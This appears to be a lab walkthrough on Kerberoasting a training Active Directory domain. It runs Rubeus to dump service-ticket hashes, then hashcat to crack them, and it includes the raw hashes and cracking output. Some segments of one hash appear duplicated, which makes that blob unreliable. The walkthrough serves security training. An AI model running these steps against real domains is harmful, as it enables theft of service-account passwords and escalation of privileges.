# Kerberoasting

Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.



Kerberoasting w/ Rubeus -&#x20;

1.) `cd Downloads` - navigate to the directory Rubeus is in

2.) `Rubeus.exe kerberoast` This will dump the Kerberos hash of any kerberoastable users   &#x20;

3.) `hashcat -m 13100 -a 0 hash.txt Pass.txt` - now crack that hash



$krb5tgs$23$_HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.local:30222_$EEA037DE86D76DD3A0E24B0C882CA560$4645B97DE5163EAD54CE762AD2B88F94C281411423BDD93E611E5FB8C3CCDBEC6F793A7BCF11FEDA41BFAEC0D5D4373BB8930612FC32DAFE6F98BE032FAA394593ACDB6E438E74777AD6ED304389E0C0D80158CD99A6E2ACD364F3D13A715F1064FAE83C7ACC6406704EB84A618C82A7C8341DF515FC586AC5E987ABDEB3CE23510C093DD56F6F0BA8C9A3276112335A48AA039042DBEB74028A3C4B13A800D36D6E366FAED3D2DEC786A61A9E1EEF384DC1C8066978F4731EB140EE7654555C563D923420E2D9E792EF9E401EB2B3355084F9E2177C76C2620EA2BBAB3298F914639BC1C494D3AEF90D5FD33FE781BABE85BB0DCDD7E67AD2226327F1EE245499569C7A928BBACDB01DF8C3A0B36820859E7E1AA8DB61ACD100395205EC5663AAF42AE027B69CDA241373117804ADF7AA4409CEBAD88A5C4EBD613669D0C1B3A9243D5FEC7EA51B0E89882716A0EE25647FFF51777DBC3819B8A71025DE83DD1E5D86B1A15EA6B15678DCD436E9673DFA657F3B4B633BBDD7B8D23E936181CA8398985715AF6F541D7ED1C3D35488971C88FD09260108FCEE24D041900967B3795F133A45A6143F5410D9B5FD47E32761B1A09031F132C0BFF1DC28506FCC44AFFE47789EBEB8BA178D3A68B9E22D26286C4D5C1B1DCD521BD5DE524AE4CE221ACC3ADF8C8B106F5D9BC57BDB6F9A667A22883085029EE9D02B88847D2E106E6F80C67ADD4548340B02757CFFDCA0ACEF7F880F2A56C4148FEB1802006D564365F928B2426B25C61F67BE9F2275CD7256680A5A081014DBC2BAAB8CA213CCDF22EB853FF387AFA732A9870FC6E0CC898FB921142FA953FFDFB4796DA9738AED4F90EFC6DC8772A99FB5542900BD9C3B002641F958249F7961613882F27D50CEEB53CE91DC7EFCF760FD8399F7F4E66CDB1264D3455C327340D33710A520559B21ED1BFAC390A2A8A19216872A0108FCEE24D041900967B3795F738AED4F90EFC6DC8772A99FB5542900BD9C3B002641F958249F7961613882F27D50CEEB53CE91DC7EFCF760FD8399F7F4E66CDB1264D3455C327340D33710A520559B21ED1BFAC390A2A8A19216872A475BC04159AC5E7602D2516F28F25D0F214D33E68328271EE3A40B69885D3F659A03B1CF48E7F3DF1973BC8CB6447E096BEDF5280610D0EB81D3569F70376CEF04A0A28FB0F4AF5A0D1D2A4AE277413535212C0DB90D0BBA9F98C653F3BC8B401A30444C1A967D025B893F12DDC21C3DFD39D0453842D0E144E25FDC2B5DDCCB9CDA471C17A03B1CF48E7F3DF1973BC8CB6447E096BEDF5280610D0EB81D3569F70376CEF04A0A28FB0F4AF5A0D1D2A4AE277413535212C0DB90D0BBA9F98C653F3BC8B401A30444C1A967D025B893F12DDC21C3DFD39D0453842D0E144E25FDC2B5DDCCB9CDA471C1731195E4C17A8979B1D1E743B91376F05AF92FA564FC3FE4D02C6F7E36DAA0767DDEDEB635EE3596AD221742223E86B8956B7732A134B7F85F110B4837D95839AD5AD2648AD0DDB48AF9C1D24EA1BD4B81A733BFC05E38C6BE81DC0A5DB905938F27E363E83FCAA565EDEA977EB62975AE6591E12D81EAACCB3FADF29A08F69098A1F78AFF0E70C65CA721DC330E9428CA55E09C888FDAA60FC2E82D6CBBF26C4EB8E00005A8E89D8EB426BB867266B2D21BFA2960BEE5C8DE285F4E6D6D174E1288CA0F4EECBF9987EFCAEADFBC37C90668E28749DC069A911B3ED837F55DDE788827412FCA1839AF7A3AF09310FBF36351BC5807FA3A0CD08E2766331E896EABC8B8AC445E2707BA83FF5A4AE77883C1091EF39C02F82A65256CD0738C44C6C933FECD4173B2BB294FDCBE8FB6D6AC47E2C1E4C8ECFCBC13E8C2D71101A17DA2579F38AAA0DC6A366F38EF86D1BADF25D9E4CEE301CC117D345A94137AC\
\
$krb5tgs$23$_SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local:30111_$9034C25DB313126B1B888A777CA24951$FDB348AA0044B1062545089810538FCCAE7DC45CB3B17D1618BD897B0D869443B5876F4E1257BA53A01C2D19D0743E7E53B92B1219CCC6C3D56EA4865B3B9A5360446AFCECFA22A7FD08E546660C2E4D54DC84EB5A1058023BF64E231CCAD9500877EBB50E8FA4ED7D1FD91C1556753A8DBE4E3578BF8183C377E7BB2A32968D26067C60D741E507246EF476B2B3605AA76C5354D4D1AFD406C0AF47DC502B03DCCC8710789A5192C65ABE570AD9F002645B7C1F6F9216BFDEECBBC464CBDBE88D97068ED88A0E3F95400788B23F541910CA323283C9B491AAC4AAE4BED04E9E50D22B76D08F53FC34F94B24399A373E7F8C90B0E35858A335AB1B7B1FBE2875F49CAE627C959697A41B173A56A538F5E1BD059D47CDFE29FFBF0336A8C8B79299D81CDDB4D8493648C0BDF0191A450679133BB7924A0A93F400BBA996E8067B532A813B8CF0B7171E6AA7B2FE2DA3E0CB8B70499B8D6F2E7FD868CE0B16FCD83278F51C7AB7EA28A899C51B848188D79E22A0EA7CE41B5694DDEC618978CC83A623FD88A21B87FD8E8F10334BDF59887CF42F0346F9FA5615272192AAC5B9B4DBF163DBCE927AC2148511CCF0735AD034BF177F5221B38E727E5FA8B80F4F1F7017BE8F266503A386EBDAAB06D33530638CFBF221BA48159FB27D63F2A9649F190291690D6E308E128ADFAE2EF758C01B9DB10601043ACFBD32F6892DE150E6A9B29376EBA83FE44B56CCE2195F5CD151E0ED489CC893CBCFD16FC8467A4BD213178D0F655F60D748BB9992AEE51D679BC431D409DDC72E1498B4D912455537F3F0420F5E5CA8AD497B8316F5FFE4B750798160C4B27DC475D38DDAA3A27B5B96C5061C61931233653C297FA754245A5AB8BD6447FF84C50E51674278DBD99423070D6672D73CF6266D893C7748B9D3316AADA052AC3F438CBB12D09E1D21009A086E40C817A6AEDFD7798FBB0A2DDB59184220438AF044150815D16FB9247A50298CE92F024EDF9713F0C2386082020688F25B806016BF433DE98AE5C89F4E51546B638121CFE92FD813849ACD46EA1B5F883E0053F4690990BDD1526147EA263EA2CF7FD1558697DF2DF293C0D765E088B71426E73745735C93F236CF322A9F555D20CB1AB306CF662CC969174F47E216666C6AB9BE8E7906459CE0B05498ABE29B4B2D0FE7B9D076C83CF6BD518AFA69E4AC559969DAA629580DA5112C0FE1CD270F0B0D5A75C9288B8A44BE13249BA0160D635E68AD2262AC0B249C4713C2E1851DD62A63C7C82EA85F41F26E8B816D1F5B4B63AD75D4D522F1C9552C4C5F5CC469D816311A5DF84AFA93CDE480C9D52DB7429C0195BD80190F35FC2DD52686B50B69D08CC43B3E4C3551ABD9AC7DDE4012C8C1BE67A04DA31740EA4DA5E5637FD0C74FA7F75AE81D08948E6F5947999FE40560486F940DBE775CF7D55C08183B58EFBB54D27B42747C6AB3BC76AD1DFB7A4C7E6DBE2ED2419982BEC8BAB1D945A49104D23EF8D38A45865869ADB38453CF8189F0312DFD872396524DDC43A1DFD1CE29890D8CD08C3D70E5824DD53B6ABFAB5432D2535C22497A80B7D57B4404374F4D15086EBA02A1310D262EC11431AC86757F13B2B6C312CABEE99D53946A739067824A8ED05AD565CCC416



Session..........: hashcat\
Status...........: Exhausted Hash.Name........: Kerberos 5, etype 23, TGS-REP Hash.Target......: $krb5tgs$23$\*HTTPService$CONTROLLER.local$CONTROLLE...94137a Time.Started.....: Thu Mar 14 09:02:04 2024 (0 secs) Time.Estimated...: Thu Mar 14 09:02:04 2024 (0 secs) Guess.Base.......: File (Pass.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 402.9 kH/s (2.66ms) @ Accel:64 Loops:1 Thr:64 Vec:8 Recovered........: 0/1 (0.00%) Digests Progress.........: 1240/1240 (100.00%) Rejected.........: 0/1240 (0.00%) Restore.Point....: 1240/1240 (100.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: 123456 -> hello123





Session..........: hashcat Status...........: Cracked Hash.Name........: Kerberos 5, etype 23, TGS-REP Hash.Target......: $krb5tgs$23$\*SQLService$CONTROLLER.local$CONTROLLER...ccc416 Time.Started.....: Thu Mar 14 09:00:59 2024 (0 secs) Time.Estimated...: Thu Mar 14 09:00:59 2024 (0 secs) Guess.Base.......: File (Pass.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 89281 H/s (1.79ms) @ Accel:8 Loops:1 Thr:64 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 1240/1240 (100.00%) Rejected.........: 0/1240 (0.00%) Restore.Point....: 1024/1240 (82.58%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: paulina -> hello123









